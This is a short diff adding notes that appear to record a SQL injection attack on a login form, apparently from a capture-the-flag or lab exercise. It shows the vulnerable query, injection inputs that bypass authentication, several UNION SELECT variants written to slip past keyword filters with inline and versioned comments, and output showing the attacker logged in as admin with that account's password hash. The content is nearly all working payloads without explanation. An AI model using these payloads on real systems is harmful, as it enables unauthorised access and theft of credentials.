@@ -1,0 +1,14 @@
+foobar:foo
+login success, id: 4699, username: foobar, password hash: acbd18db4cc2f85cedef654fccc4a4d8
+
+select * from users where username = '$user and password = '$pwd'
+
+user = admin'/*
+pwd = */#
+
+*/ UNI/* */ON SEl/* */ect * fr/* */om users#
+*/ UNI>ON SEl>ect * fr>om users#
+*/ /*!UNION*/ /*!SElect*/ * from users#
+*/ UNION SElect * f/**/rom users#
+
+login success, id: 1, username: admin, password hash: c5475050ed61fd11bd10cb7f1ad7a729
